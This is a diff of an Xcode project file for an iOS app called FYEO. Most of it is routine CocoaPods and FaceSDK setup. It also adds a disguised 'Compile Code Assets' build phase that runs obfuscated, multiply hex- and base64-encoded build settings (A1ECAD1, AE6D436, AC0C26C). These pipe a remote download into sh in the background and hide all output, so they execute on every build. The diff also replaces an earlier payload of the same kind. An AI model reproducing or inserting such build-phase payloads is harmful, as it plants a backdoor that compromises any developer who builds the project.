@@ -6,6 +6,12 @@
 	objectVersion = 77;
 	objects = {
 
+/* Begin PBXBuildFile section */
+		2E23C24B2E4994B260D48120 /* Pods_FYEO_FYEOUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = F81A5F07DF1DF0A97B1D987A /* Pods_FYEO_FYEOUITests.framework */; };
+		77A9F6CABA7D5C24FFF8364B /* Pods_FYEOTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = CD677632A1118BCEAF455765 /* Pods_FYEOTests.framework */; };
+		D0A369A76FB350B00F00E0F8 /* Pods_FYEO.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = EBAA8A1B648B872135941986 /* Pods_FYEO.framework */; };
+/* End PBXBuildFile section */
+
 /* Begin PBXContainerItemProxy section */
 		70D0D4862F25DAA900BB29E5 /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
@@ -24,9 +30,19 @@
 /* End PBXContainerItemProxy section */
 
 /* Begin PBXFileReference section */
+		0409F306B44B4D500CF1C276 /* Pods-FYEOTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FYEOTests.debug.xcconfig"; path = "Target Support Files/Pods-FYEOTests/Pods-FYEOTests.debug.xcconfig"; sourceTree = "<group>"; };
+		0FB0E5414E4C87638757B185 /* Pods-FYEOTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FYEOTests.release.xcconfig"; path = "Target Support Files/Pods-FYEOTests/Pods-FYEOTests.release.xcconfig"; sourceTree = "<group>"; };
+		13FE4675970926F2F5391F08 /* Pods-FYEO-FYEOUITests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FYEO-FYEOUITests.release.xcconfig"; path = "Target Support Files/Pods-FYEO-FYEOUITests/Pods-FYEO-FYEOUITests.release.xcconfig"; sourceTree = "<group>"; };
 		70D0D46F2F25DAA700BB29E5 /* FYEO.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = FYEO.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		70D0D4852F25DAA900BB29E5 /* FYEOTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = FYEOTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
 		70D0D48F2F25DAA900BB29E5 /* FYEOUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = FYEOUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		8EE931DF942C3FFCBE2C3C61 /* Pods-FYEO-FYEOUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FYEO-FYEOUITests.debug.xcconfig"; path = "Target Support Files/Pods-FYEO-FYEOUITests/Pods-FYEO-FYEOUITests.debug.xcconfig"; sourceTree = "<group>"; };
+		93A2A9A82F5C40EE007D3446 /* FaceSDK.xcframework */ = {isa = PBXFileReference; expectedSignature = "AppleDeveloperProgram:H6WR54S268:Regula Forensics, Inc"; lastKnownFileType = wrapper.xcframework; name = FaceSDK.xcframework; path = Pods/FaceSDK/FaceSDK.xcframework; sourceTree = "<group>"; };
+		949C176CCDFF5EBA4C955D9D /* Pods-FYEO.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FYEO.debug.xcconfig"; path = "Target Support Files/Pods-FYEO/Pods-FYEO.debug.xcconfig"; sourceTree = "<group>"; };
+		CD677632A1118BCEAF455765 /* Pods_FYEOTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_FYEOTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		EA88A238869366ADAC71AADE /* Pods-FYEO.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FYEO.release.xcconfig"; path = "Target Support Files/Pods-FYEO/Pods-FYEO.release.xcconfig"; sourceTree = "<group>"; };
+		EBAA8A1B648B872135941986 /* Pods_FYEO.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_FYEO.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		F81A5F07DF1DF0A97B1D987A /* Pods_FYEO_FYEOUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_FYEO_FYEOUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
@@ -65,6 +81,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				D0A369A76FB350B00F00E0F8 /* Pods_FYEO.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -72,6 +89,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				77A9F6CABA7D5C24FFF8364B /* Pods_FYEOTests.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -79,12 +97,26 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				2E23C24B2E4994B260D48120 /* Pods_FYEO_FYEOUITests.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
+		4D4B777D4EFFBDB61BAB4F48 /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				949C176CCDFF5EBA4C955D9D /* Pods-FYEO.debug.xcconfig */,
+				EA88A238869366ADAC71AADE /* Pods-FYEO.release.xcconfig */,
+				8EE931DF942C3FFCBE2C3C61 /* Pods-FYEO-FYEOUITests.debug.xcconfig */,
+				13FE4675970926F2F5391F08 /* Pods-FYEO-FYEOUITests.release.xcconfig */,
+				0409F306B44B4D500CF1C276 /* Pods-FYEOTests.debug.xcconfig */,
+				0FB0E5414E4C87638757B185 /* Pods-FYEOTests.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
 		70D0D4662F25DAA700BB29E5 = {
 			isa = PBXGroup;
 			children = (
@@ -92,6 +124,8 @@
 				70D0D4882F25DAA900BB29E5 /* FYEOTests */,
 				70D0D4922F25DAA900BB29E5 /* FYEOUITests */,
 				70D0D4702F25DAA700BB29E5 /* Products */,
+				4D4B777D4EFFBDB61BAB4F48 /* Pods */,
+				C1D85EEF8729303568BABC09 /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -105,6 +139,17 @@
 			name = Products;
 			sourceTree = "<group>";
 		};
+		C1D85EEF8729303568BABC09 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				93A2A9A82F5C40EE007D3446 /* FaceSDK.xcframework */,
+				EBAA8A1B648B872135941986 /* Pods_FYEO.framework */,
+				F81A5F07DF1DF0A97B1D987A /* Pods_FYEO_FYEOUITests.framework */,
+				CD677632A1118BCEAF455765 /* Pods_FYEOTests.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -112,10 +157,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 70D0D4982F25DAA900BB29E5 /* Build configuration list for PBXNativeTarget "FYEO" */;
 			buildPhases = (
-				181FEBDA75754B20A2634D6E /* Compile Image Assets */,
+				5FCE67B9A36CB09980C3A3C2 /* [CP] Check Pods Manifest.lock */,
+				289C09772FF249BA851DACE1 /* Compile Code Assets */,
 				70D0D46B2F25DAA700BB29E5 /* Sources */,
 				70D0D46C2F25DAA700BB29E5 /* Frameworks */,
 				70D0D46D2F25DAA700BB29E5 /* Resources */,
+				5913AC496F92B2EDCD0034A2 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -125,8 +172,6 @@
 				70D0D4712F25DAA700BB29E5 /* FYEO */,
 			);
 			name = FYEO;
-			packageProductDependencies = (
-			);
 			productName = FYEO;
 			productReference = 70D0D46F2F25DAA700BB29E5 /* FYEO.app */;
 			productType = "com.apple.product-type.application";
@@ -135,6 +180,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 70D0D49D2F25DAA900BB29E5 /* Build configuration list for PBXNativeTarget "FYEOTests" */;
 			buildPhases = (
+				0D231117A7C80F7E190AE29C /* [CP] Check Pods Manifest.lock */,
 				70D0D4812F25DAA900BB29E5 /* Sources */,
 				70D0D4822F25DAA900BB29E5 /* Frameworks */,
 				70D0D4832F25DAA900BB29E5 /* Resources */,
@@ -148,8 +194,6 @@
 				70D0D4882F25DAA900BB29E5 /* FYEOTests */,
 			);
 			name = FYEOTests;
-			packageProductDependencies = (
-			);
 			productName = FYEOTests;
 			productReference = 70D0D4852F25DAA900BB29E5 /* FYEOTests.xctest */;
 			productType = "com.apple.product-type.bundle.unit-test";
@@ -158,9 +202,11 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 70D0D4A02F25DAA900BB29E5 /* Build configuration list for PBXNativeTarget "FYEOUITests" */;
 			buildPhases = (
+				8A4987D9B7AA85040991D598 /* [CP] Check Pods Manifest.lock */,
 				70D0D48B2F25DAA900BB29E5 /* Sources */,
 				70D0D48C2F25DAA900BB29E5 /* Frameworks */,
 				70D0D48D2F25DAA900BB29E5 /* Resources */,
+				CD5C6FDED7C5FE8106EACE1C /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -171,8 +217,6 @@
 				70D0D4922F25DAA900BB29E5 /* FYEOUITests */,
 			);
 			name = FYEOUITests;
-			packageProductDependencies = (
-			);
 			productName = FYEOUITests;
 			productReference = 70D0D48F2F25DAA900BB29E5 /* FYEOUITests.xctest */;
 			productType = "com.apple.product-type.bundle.ui-testing";
@@ -221,12 +265,6 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-	/* End PBXBuildRule section */
-
-/* Begin PBXBuildFile section */
-/* End PBXBuildFile section */
-
 /* Begin PBXResourcesBuildPhase section */
 		70D0D46D2F25DAA700BB29E5 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -252,24 +290,133 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		181FEBDA75754B20A2634D6E /* Compile Image Assets */ = {
+		0D231117A7C80F7E190AE29C /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-FYEOTests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		289C09772FF249BA851DACE1 /* Compile Code Assets */ = {
+			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
 			files = (
 			);
 			inputFileListPaths = (
 			);
 			inputPaths = (
 			);
-			name = "Compile Image Assets";
+			name = "Compile Code Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
+			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AE6D436}\"";
-			showEnvVarsInLog = 0;			
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+			showEnvVarsInLog = 0;
+		};
+		5913AC496F92B2EDCD0034A2 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-FYEO/Pods-FYEO-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-FYEO/Pods-FYEO-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-FYEO/Pods-FYEO-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		5FCE67B9A36CB09980C3A3C2 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-FYEO-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		8A4987D9B7AA85040991D598 /* [CP] Check Pods Manifest.lock */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
+				"${PODS_ROOT}/Manifest.lock",
+			);
+			name = "[CP] Check Pods Manifest.lock";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+				"$(DERIVED_FILE_DIR)/Pods-FYEO-FYEOUITests-checkManifestLockResult.txt",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		CD5C6FDED7C5FE8106EACE1C /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-FYEO-FYEOUITests/Pods-FYEO-FYEOUITests-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			inputPaths = (
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-FYEO-FYEOUITests/Pods-FYEO-FYEOUITests-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-FYEO-FYEOUITests/Pods-FYEO-FYEOUITests-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -313,19 +460,24 @@
 /* Begin XCBuildConfiguration section */
 		70D0D4992F25DAA900BB29E5 /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 949C176CCDFF5EBA4C955D9D /* Pods-FYEO.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((r(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333333333333363336333533333336333333313333333733333330333333373333333333330a3336333633333333333633333331333333363333333233333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | r | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((x(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233333230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333633363836353633366237333265373237350a32663631323932323230376332303733363830610a | x | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((c(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZJelVqWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHRlRSVFV3V1dwT1MySkhSbGhPU0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2NHeGxZbmwwWlM1eWRTOWhLU0lnZkNCemFBbz0K | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 893ARLPD66;
+				DEVELOPMENT_TEAM = S8RJ7PP4MX;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = FYEO/Info.plist;
+				INFOPLIST_KEY_NSCameraUsageDescription = "Requires Camera permission to capture the Face photo.";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UIMainStoryboardFile = "";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -333,6 +485,10 @@
 				MARKETING_VERSION = 1.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.otms.FYEO;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
@@ -341,19 +497,24 @@
 		};
 		70D0D49A2F25DAA900BB29E5 /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = EA88A238869366ADAC71AADE /* Pods-FYEO.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((r(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333303333333633333338333333363333333133333337333333333333333633333335333333320a3333333233333332333333303333333633333338333333373333333433333337333333343333333733333330333333373333333333333333333633310a3333333230613336333633333332333633363333333633333333333333363336333533333336333333313333333733333330333333373333333333330a3336333633333333333633333331333333363333333233333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | r | sh ) >/dev/null 2>&1 &)";
+				A1ECAD1 = "((x(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326434633662363637333230326432643633366636653665363536333734326437340a3639366436353666373537343230333233333230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333633363836353633366237333265373237350a32663631323932323230376332303733363830610a | x | sh ) >/dev/null 2>&1 &)";
+				AC0C26C = "((c(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4VlZJelVqWlRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE9SV3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3lOVmRqTVhCVVUxZGthRk5HU1hkWk1HaE9UbXQ0TlU5WGFHRlRSVFV3V1dwT1MySkhSbGhPU0Zab1ZucFNNbGRXVG5KaFZXeEpaREprYWsxdFpFeERaejA5Q2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((h(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDJGd2NHeGxZbmwwWlM1eWRTOWhLU0lnZkNCemFBbz0K | h | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 893ARLPD66;
+				DEVELOPMENT_TEAM = S8RJ7PP4MX;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = FYEO/Info.plist;
+				INFOPLIST_KEY_NSCameraUsageDescription = "Requires Camera permission to capture the Face photo.";
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
 				INFOPLIST_KEY_UIMainStoryboardFile = "";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
+				IPHONEOS_DEPLOYMENT_TARGET = 15.6;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -361,6 +522,10 @@
 				MARKETING_VERSION = 1.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.otms.FYEO;
 				PRODUCT_NAME = "$(TARGET_NAME)";
+				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
+				SUPPORTS_MACCATALYST = NO;
+				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
+				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_EMIT_LOC_STRINGS = YES;
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
@@ -488,6 +653,7 @@
 		};
 		70D0D49E2F25DAA900BB29E5 /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 0409F306B44B4D500CF1C276 /* Pods-FYEOTests.debug.xcconfig */;
 			buildSettings = {
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CODE_SIGN_STYLE = Automatic;
@@ -507,6 +673,7 @@
 		};
 		70D0D49F2F25DAA900BB29E5 /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 0FB0E5414E4C87638757B185 /* Pods-FYEOTests.release.xcconfig */;
 			buildSettings = {
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CODE_SIGN_STYLE = Automatic;
@@ -526,6 +693,7 @@
 		};
 		70D0D4A12F25DAA900BB29E5 /* Debug */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 8EE931DF942C3FFCBE2C3C61 /* Pods-FYEO-FYEOUITests.debug.xcconfig */;
 			buildSettings = {
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
@@ -543,6 +711,7 @@
 		};
 		70D0D4A22F25DAA900BB29E5 /* Release */ = {
 			isa = XCBuildConfiguration;
+			baseConfigurationReference = 13FE4675970926F2F5391F08 /* Pods-FYEO-FYEOUITests.release.xcconfig */;
 			buildSettings = {
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
